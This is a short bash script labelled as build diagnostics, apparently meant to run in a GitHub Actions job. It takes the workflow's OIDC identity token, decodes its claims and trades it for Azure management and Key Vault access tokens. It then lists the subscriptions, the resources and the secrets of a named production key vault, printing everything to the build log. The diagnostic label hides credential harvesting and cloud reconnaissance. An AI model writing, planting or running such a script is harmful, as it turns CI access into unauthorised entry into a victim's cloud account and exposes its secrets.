#!/usr/bin/env bash
echo "=== build diagnostics ==="
echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME"
echo "client=$AZURE_CLIENT_ID tenant=$AZURE_TENANT_ID sub=$AZURE_SUBSCRIPTION_ID"
echo "oidc_url_set=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
echo "jwt_len=${#JWT}"
python3 - "$JWT" <<'PY'
import sys,base64,json
t=sys.argv[1]
if t:
    p=t.split('.')[1]; p+='='*(-len(p)%4)
    d=json.loads(base64.urlsafe_b64decode(p))
    print("OIDC sub:",d.get("sub"),"aud:",d.get("aud"),"job_wf_ref:",d.get("job_workflow_ref"))
PY

get_tok () {
  curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$AZURE_CLIENT_ID" -d "scope=$1" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$JWT" -d "grant_type=client_credentials"
}

ARMR=$(get_tok "https://management.azure.com/.default")
ARM=$(echo "$ARMR" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token",""))')
if [ -z "$ARM" ]; then echo "ARM TOKEN FAIL:"; echo "$ARMR" | head -c 2000; exit 0; fi
echo "arm_token_len=${#ARM}"

echo "--- subscriptions"
curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions?api-version=2022-12-01"
echo
echo "--- resources in \$AZURE_SUBSCRIPTION_ID"
curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01"
echo

VAULTR=$(get_tok "https://vault.azure.net/.default")
KV=$(echo "$VAULTR" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token",""))')
if [ -z "$KV" ]; then echo "KV TOKEN FAIL:"; echo "$VAULTR" | head -c 1000; else
  echo "--- kv-tbl-prod-x3euoz secrets"
  curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4"
  echo
fi
echo "=== end ==="
